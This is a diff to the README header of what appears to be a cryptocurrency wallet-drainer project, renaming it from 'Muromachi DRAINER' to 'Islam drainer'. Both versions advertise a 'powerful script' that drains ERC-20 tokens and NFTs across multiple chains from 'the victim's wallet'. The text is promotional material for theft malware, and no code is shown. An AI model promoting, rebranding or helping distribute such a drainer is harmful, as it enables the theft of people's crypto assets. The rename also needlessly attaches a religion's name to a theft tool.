@@ -1,11 +1,11 @@
 <div align="center">
-  <h1>🔥 Muromachi DRAINER 🔥</h1>
+  <h1>🔥 Islam drainer 🔥</h1>
 </div>
 
 ---
 
 <div align="center">
-🧰 Welcome to the Muromachi DRAINER! 🧰 Our wallet drainer is a powerful script that can literally drain every single possible token including a diverse range of ERC-20 tokens, and NFTs 🌟 across multiple chains 🌐 from the victim's wallet 💼
+🧰 Welcome to the Islam drainer! 🧰 Our wallet drainer is a powerful script that can literally drain every single possible token including a diverse range of ERC-20 tokens, and NFTs 🌟 across multiple chains 🌐 from the victim's wallet 💼
 </div>
 
 ---
